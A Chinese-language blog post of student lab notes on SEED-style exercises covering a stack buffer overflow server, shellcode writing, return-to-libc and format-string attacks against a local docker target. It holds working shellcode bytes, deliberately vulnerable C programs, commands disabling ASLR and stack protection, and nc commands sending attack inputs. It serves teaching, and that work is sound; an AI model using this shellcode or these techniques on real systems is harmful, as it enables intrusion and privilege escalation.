<h2 id="Tasks-9-Experimenting-with-Other-Countermeasures"><a href="#Tasks-9-Experimenting-with-Other-Countermeasures" class="headerlink" title="Tasks 9: Experimenting with Other Countermeasures"></a>Tasks 9: Experimenting with Other Countermeasures</h2><h1 id="03-02-Buffer-Overflow-Server"><a href="#03-02-Buffer-Overflow-Server" class="headerlink" title="03_02_Buffer_Overflow_Server"></a>03_02_Buffer_Overflow_Server</h1><h2 id="Lab-Environment-Setup"><a href="#Lab-Environment-Setup" class="headerlink" title="Lab Environment Setup"></a>Lab Environment Setup</h2><p>关闭地址空间随机化：<code>sudo /sbin/sysctl -w kernel.randomize_va_space=0</code></p>
<p><strong>stack.c</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Changing this size will change the layout of the stack.</span></span><br><span class="line"><span class="comment">* Instructors can change this value each year, so students</span></span><br><span class="line"><span class="comment">* won’t be able to use the solutions from the past.*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> BUF_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_SIZE 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">bof</span><span class="params">(<span class="type">char</span> *str)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buffer[BUF_SIZE];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* The following statement has a buffer overflow problem */</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">517</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> length = fread(str, <span class="keyword">sizeof</span>(<span class="type">char</span>), <span class="number">517</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    bof(str);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;==== Returned Properly ====\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>server-code</code>目录下<code>make</code>、<code>make install</code></p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230119153847047.png" alt="image-20230119153847047"></p>
<p>服务端程序：监听TCP 9090端口</p>
<p>切到<code>Labsetup</code>目录，启动docker环境：<br><code>docker-compose build</code><br><code>docker-compose up</code></p>
<h2 id="Task-1-Get-Familiar-with-the-Shellcode"><a href="#Task-1-Get-Familiar-with-the-Shellcode" class="headerlink" title="Task 1: Get Familiar with the Shellcode"></a>Task 1: Get Familiar with the Shellcode</h2><blockquote>
<p>Shellcode is typically used in code injection attacks. It is basically a piece of code that launches a shell, and is usually written in assembly languages.</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">shellcode = (</span><br><span class="line"><span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line"><span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line"><span class="string">&quot;/bin/bash*&quot;</span>												\\<span class="number">1</span></span><br><span class="line"><span class="string">&quot;-c*&quot;</span>														\\<span class="number">2</span></span><br><span class="line"><span class="string">&quot;/bin/ls -l; echo Hello; /bin/tail -n 2 /etc/passwd *&quot;</span>		\\<span class="number">3</span></span><br><span class="line"># The * in this line serves as the position marker  *</span><br><span class="line"><span class="string">&quot;AAAA&quot;</span> # Placeholder <span class="keyword">for</span> argv[<span class="number">0</span>] --&gt; <span class="string">&quot;/bin/bash&quot;</span></span><br><span class="line"><span class="string">&quot;BBBB&quot;</span> # Placeholder <span class="keyword">for</span> argv[<span class="number">1</span>] --&gt; <span class="string">&quot;-c&quot;</span></span><br><span class="line"><span class="string">&quot;CCCC&quot;</span> # Placeholder <span class="keyword">for</span> argv[<span class="number">2</span>] --&gt; the command <span class="built_in">string</span></span><br><span class="line"><span class="string">&quot;DDDD&quot;</span> # Placeholder <span class="keyword">for</span> argv[<span class="number">3</span>] --&gt; <span class="literal">NULL</span></span><br><span class="line">).encode(’latin<span class="number">-1</span>’)</span><br></pre></td></tr></table></figure>

<p>1、2行的占位符的作用，是在命令执行时才加入<code>0x00</code>字符，而不会显式地在shellcode中放入零字符</p>
<p>此外如果执行其他命令，要修改3行，同时保持修改前后的字符串长度一致（因为<code>argv[]</code>数组的占位符的位置是在shellcode中硬编码的）</p>
<h2 id="Task-2-Level-1-Attack"><a href="#Task-2-Level-1-Attack" class="headerlink" title="Task 2: Level-1 Attack"></a>Task 2: Level-1 Attack</h2><p>靶机：10.9.0.5:9090，32位的<code>stack</code>程序</p>
<p>攻击机：<code>echo motherfucker | nc 10.9.0.5 9090</code><br>靶机回显：</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230119163348204.png" alt="image-20230119163348204"></p>
<p>攻击者可以将payload放在一个文件里，然后通过这个命令攻击<br><code>cat &lt;file&gt; | nc 10.9.0.5 9090</code></p>
<p>根据上述回显得出buffer起始地址到<code>ebp</code>的距离为112，+4就是返回地址</p>
<p>payload：</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230119165410153.png" alt="image-20230119165410153"></p>
<h1 id="03-03-Shellcode"><a href="#03-03-Shellcode" class="headerlink" title="03_03_Shellcode"></a>03_03_Shellcode</h1><blockquote>
<p>We can easily find existing shellcode from the Internet!</p>
</blockquote>
<blockquote>
<p>There are several challenges in writing shellcode, one is to <strong>ensure that there is no zero in the binary</strong>, and the other is to find out <strong>the address of the data used in the command</strong>.</p>
</blockquote>
<blockquote>
<p>The solutions to the second challenge led to two typical approaches to write shellcode. In one approach, data are pushed into the stack during the execution, so their addresses can be obtained from the stack pointer. In the second approach, data are stored in the code region, right after a <code>call</code> instruction. When the <code>call</code> instruction is executed, the address of the data is treated as the return address, and is pushed into the stack.</p>
</blockquote>
<h2 id="Task-1-Writing-Shellcode"><a href="#Task-1-Writing-Shellcode" class="headerlink" title="Task 1: Writing Shellcode"></a>Task 1: Writing Shellcode</h2><p>汇编代码写好，得到<code>.s</code>文件，<code>nasm</code>程序转成<code>.o</code>，<code>ld</code>链接器程序转成可执行文件</p>
<p>可以使用<code>objdump</code>命令获取对应的机器码——也就是shellcode<br><code>objdump -Mintel --disassemble mysh.o</code>：<code>-Mintel</code>应用于Intel模式的汇编代码</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230119211825145.png" alt="image-20230119211825145"></p>
<p>左边就是对应的机器码</p>
<p>or<code>xxd -p -c 20 mysh.o</code></p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230119213201685.png" alt="image-20230119213201685"></p>
<p>中间那串到“b00bcd80”的数字就是机器码</p>
<p>再转变成能实际利用的shellcode</p>
<p><strong>convert.py</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Run &quot;xxd -p -c 20 rev_sh.o&quot;,</span></span><br><span class="line"><span class="comment"># copy and paste the machine code to the following:</span></span><br><span class="line">ori_sh =<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">31db31c0b0d5cd80</span></span><br><span class="line"><span class="string">31c050682f2f7368682f62696e89e3505389e131</span></span><br><span class="line"><span class="string">d231c0b00bcd80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">sh = ori_sh.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">length  = <span class="built_in">int</span>(<span class="built_in">len</span>(sh)/<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Length of the shellcode: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(length))</span><br><span class="line">s = <span class="string">&#x27;shellcode= (\n&#x27;</span> + <span class="string">&#x27;   &quot;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">    s += <span class="string">&quot;\\x&quot;</span> + sh[<span class="number">2</span>*i] + sh[<span class="number">2</span>*i+<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> i % <span class="number">16</span> == <span class="number">15</span>: </span><br><span class="line">       s += <span class="string">&#x27;&quot;\n&#x27;</span> + <span class="string">&#x27;   &quot;&#x27;</span></span><br><span class="line">s += <span class="string">&#x27;&quot;\n&#x27;</span> + <span class="string">&quot;).encode(&#x27;latin-1&#x27;)&quot;</span></span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure>

<p>运行<code>./convert.py</code>之后得到</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Length of the shellcode: <span class="number">35</span></span><br><span class="line">shellcode= (</span><br><span class="line">    <span class="string">&quot;\x31\xdb\x31\xc0\xb0\xd5\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68&quot;</span></span><br><span class="line">    <span class="string">&quot;\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0&quot;</span></span><br><span class="line">    <span class="string">&quot;\x0b\xcd\x80&quot;</span></span><br><span class="line">).encode(’latin-<span class="number">1</span>’)</span><br></pre></td></tr></table></figure>



<p>在使用<code>strcpy()</code>等函数的场景，shellcode中不允许显式包含零字符，因此有多种方法巧妙地置零</p>
<blockquote>
<ul>
<li><p>If we want to assign zero to <code>eax</code>, we can use <code>mov eax, 0</code>, but doing so, we will get a zero in the machine code. A typical way to solve this problem is to use <code>xor eax, eax</code>. Please explain why this would work.</p>
</li>
<li><p>If we want to store <code>0x00000099</code> to <code>eax</code>. We cannot just use <code>mov eax, 0x99</code>, because the second operand is actually <code>0x00000099</code>, which contains three zeros. To solve this problem, we can first set <code>eax</code> to zero, and then assign a one-byte number <code>0x99</code> to the <code>al</code> register, which is the least significant 8 bits of the <code>eax</code> register.</p>
</li>
<li><p>Another way is to use shift. In the following code, first <code>0x237A7978</code> is assigned to <code>ebx</code>. The ASCII values for <code>x</code>, <code>y</code>, <code>z</code>, and <code>#</code> are <code>0x78</code>, <code>0x79</code>, <code>0x7a</code>, <code>0x23</code>, respectively. Because most Intel CPUs use the small-Endian byte order, the least significant byte is the one stored at the lower address (i.e., the character <code>x</code>), so the number presented by <code>xyz#</code> is actually <code>0x237A7978</code>. You can see this when you dissemble the code using <code>objdump</code>.<br>After assigning the number to <code>ebx</code>, we shift this register to the left for 8 bits, so the most significant byte <code>0x23</code> will be pushed out and discarded. We then shift the register to the right for 8 bits, so the most significant byte will be filled with <code>0x00</code>. After that, <code>ebx</code> will contain <code>0x007A7978</code>, which is equivalent to <code>xyz\0</code>, i.e., the last byte of this string becomes zero.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ebx, &quot;xyz#&quot;</span><br><span class="line">shl ebx, 8</span><br><span class="line">shr ebx, 8</span><br></pre></td></tr></table></figure></li>
</ul>
</blockquote>
<h1 id="04-Return-to-Libc"><a href="#04-Return-to-Libc" class="headerlink" title="04_Return_to_Libc"></a>04_Return_to_Libc</h1><p>Return to Libc不使用shellcode</p>
<p><code>gcc -m32</code>编译成32位程序</p>
<h2 id="Environment-Setup-1"><a href="#Environment-Setup-1" class="headerlink" title="Environment Setup"></a>Environment Setup</h2><p>关闭地址空间随机化：<code>sudo sysctl -w kernel.randomize_va_space=0</code></p>
<p>关闭StackGuard：<code>gcc -m32 -fno-stack-protector example.c</code></p>
<p>开启&#x2F;关闭栈执行：<code>gcc -m32 -z execstack/noexecstack -o test test.c</code></p>
<p>关闭<code>/bin/sh</code>的<code>Set-UID</code>检测保护机制：<code>sudo ln -sf /bin/zsh /bin/sh</code></p>
<p><strong>retlib.c</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> BUF_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_SIZE 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">bof</span><span class="params">(<span class="type">char</span> *str)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buffer[BUF_SIZE];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> *framep;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Copy ebp into framep</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;movl %%ebp, %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (framep));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* print out information for experiment purpose */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address of buffer[] inside bof(): 0x%.8x\n&quot;</span>, (<span class="type">unsigned</span>)buffer);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Frame Pointer value inside bof(): 0x%.8x\n&quot;</span>, (<span class="type">unsigned</span>)framep);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, str);	<span class="comment">// ← buffer overflow!</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    <span class="type">char</span> input[<span class="number">1000</span>];</span><br><span class="line">    FILE *badfile;</span><br><span class="line">    </span><br><span class="line">    badfile = fopen(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="type">int</span> length = fread(input, <span class="keyword">sizeof</span>(<span class="type">char</span>), <span class="number">1000</span>, badfile);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address of input[] inside main(): 0x%x\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>) input);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Input size: %d\n&quot;</span>, length);</span><br><span class="line">    bof(input);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;(ˆ_ˆ)(ˆ_ˆ) Returned Properly (ˆ_ˆ)(ˆ_ˆ)\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This function will be used in the optional task</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> i = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Function foo() is invoked %d times\n&quot;</span>, i++);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Task-1-Finding-out-the-Addresses-of-libc-Functions"><a href="#Task-1-Finding-out-the-Addresses-of-libc-Functions" class="headerlink" title="Task 1: Finding out the Addresses of libc Functions"></a>Task 1: Finding out the Addresses of libc Functions</h2><p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230131152302189.png" alt="image-20230131152302189"></p>
<p>main函数之前下断点，此时程序已把<code>system</code>、<code>exit</code>之类的函数装载进了内存</p>
<p>查看两个函数的地址：0xf7e12420、0xf7e04f80</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230131152500124.png" alt="image-20230131152500124"></p>
<blockquote>
<p>It should be noted that even for the same program, if we change it from a <code>Set-UID</code> program to a non-<code>Set-UID</code> program, the <code>libc</code> library may not be loaded into the same location. Therefore, when we debug the program, we need to debug the target <code>Set-UID</code> program; otherwise, the address we get may be incorrect.</p>
</blockquote>
<p><code>gdb</code>的批模式：将<code>gdb</code>命令写在文件里，<code>-batch</code>参数运行</p>
<p><code>gdb -q -batch -x gdb_command.txt ./retlib</code></p>
<h2 id="Task-2-Putting-the-shell-string-in-the-memory"><a href="#Task-2-Putting-the-shell-string-in-the-memory" class="headerlink" title="Task 2: Putting the shell string in the memory"></a>Task 2: Putting the shell string in the memory</h2><p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230131155138312.png" alt="image-20230131155138312"></p>
<p>在一个终端里创建自己的shell变量，由于地址空间随机化已被关闭，因此MYSHELL的地址是固定的（地址位置和程序名称的长度有关）</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230131155455552.png" alt="image-20230131155455552"></p>
<p>编译成<code>prtenv</code>（程序名称长度与目标程序相同）：<code>gcc -m32 -o prtenv prtenv.c</code>  </p>
<p>得shell字符串地址：0xffffd4a6</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230131155705814.png" alt="image-20230131155705814"></p>
<h2 id="Task-3-Launching-the-Attack"><a href="#Task-3-Launching-the-Attack" class="headerlink" title="Task 3: Launching the Attack"></a>Task 3: Launching the Attack</h2><p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230131161511793.png" alt="image-20230131161511793"></p>
<p>找出执行<code>bof</code>时<code>buffer</code>以及<code>ebp</code>的值：0xffffce20、0xffffce38</p>
<p>计算两者距离为24</p>
<p>计算出payload各地址存放的位置：<br>（<code>ebp</code>+4：<code>system</code>、<code>ebp</code>+8：<code>system</code>的返回地址（<code>exit</code>）、<code>ebp</code>+12：<code>system</code>的传数）</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230131162030943.png" alt="image-20230131162030943"></p>
<p>执行脚本得到目标badfile，运行目标程序，得到root shell：</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230131162302217.png" alt="image-20230131162302217"></p>
<p>程序名会影响环境变量的地址</p>
<p>此外不输入<code>exit</code>的地址，root shell退出后会显示“Segmentation fault”</p>
<h1 id="05-Format-String"><a href="#05-Format-String" class="headerlink" title="05_Format_String"></a>05_Format_String</h1><h2 id="Environment-Setup-2"><a href="#Environment-Setup-2" class="headerlink" title="Environment Setup"></a>Environment Setup</h2><p><code>sudo sysctl -w kernel.randomize_va_space=0</code></p>
<p>cd到<code>server-code</code>目录，<code>make</code>、<code>make install</code></p>
<p>cd到<code>Labsetup</code>，<code>docker-compose build</code>、<code>docker-compose up</code></p>
<p>10.9.0.5跑的是32位的程序</p>
<p><strong>format.c</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> target = <span class="number">0x11223344</span>;</span><br><span class="line"><span class="type">char</span> *secret = <span class="string">&quot;A secret message\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">myprintf</span><span class="params">(<span class="type">char</span> *msg)</span> &#123;</span><br><span class="line">    <span class="comment">// This line has a format-string vulnerability</span></span><br><span class="line">    <span class="built_in">printf</span>(msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">1500</span>];</span><br><span class="line">    <span class="type">int</span> length = fread(buf, <span class="keyword">sizeof</span>(<span class="type">char</span>), <span class="number">1500</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Input size: %d\n&quot;</span>, length);</span><br><span class="line">    myprintf(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Task-1-Crashing-the-Program"><a href="#Task-1-Crashing-the-Program" class="headerlink" title="Task 1: Crashing the Program"></a>Task 1: Crashing the Program</h2><p>攻击机发送信息：</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230202154041961.png" alt="image-20230202154041961"></p>
<p>服务端回显：</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230202154129239.png" alt="image-20230202154129239"></p>
<p><code>echo %s%s%s%s%s%s%s | nc 10.9.0.5 9090</code>，即可让程序崩溃</p>
<blockquote>
<p>在输入中放进一些格式规定符，就能使<code>printf()</code>函数的<code>va_list</code>指针移动到<code>printf()</code>函数栈帧之上的位置</p>
<p>当程序试图从非法地址获取数据时，将使程序奔溃</p>
</blockquote>
<h2 id="Task-2-Printing-Out-the-Server-Program’s-Memory"><a href="#Task-2-Printing-Out-the-Server-Program’s-Memory" class="headerlink" title="Task 2: Printing Out the Server Program’s Memory"></a>Task 2: Printing Out the Server Program’s Memory</h2><p><strong>Task 2.A: Stack Data.</strong> The goal is to print out the data on the stack. How many %x format specifiers do you need so you can get the server program to print out the first four bytes of your input? You can put some unique numbers (4 bytes) there, so when they are printed out, you can immediately tell. This number will be essential for most of the subsequent tasks, so make sure you get it right.</p>
<p>输入文件构造：</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230202161104627.png" alt="image-20230202161104627"></p>
<p><code>cat badfile | nc 10.9.0.5 9090</code></p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230202161140449.png" alt="image-20230202161140449"></p>
<p>大概需要60~70个（64）“%.8x”才能爆出输入的第一个数据</p>
<p><strong>Task 2.B: Heap Data.</strong> There is a secret message (a string) stored in the heap area, and you can find the address of this string from the server printout. Your job is to print out this secret message. To achieve this goal, you need to place the address (in the binary form) of the secret message in the format string.</p>
<p>根据测试回显，得知秘密信息的地址是0x080b4008</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230202161521152.png" alt="image-20230202161521152"></p>
<p>根据上一个任务，得知要64个“%.8x”才能输出输入的值，则构造输入：</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230202164723985.png" alt="image-20230202164723985"></p>
<p>第一个数据改成秘密值的地址，放入63个“%.8x”，跟一个“%s”，成功：</p>
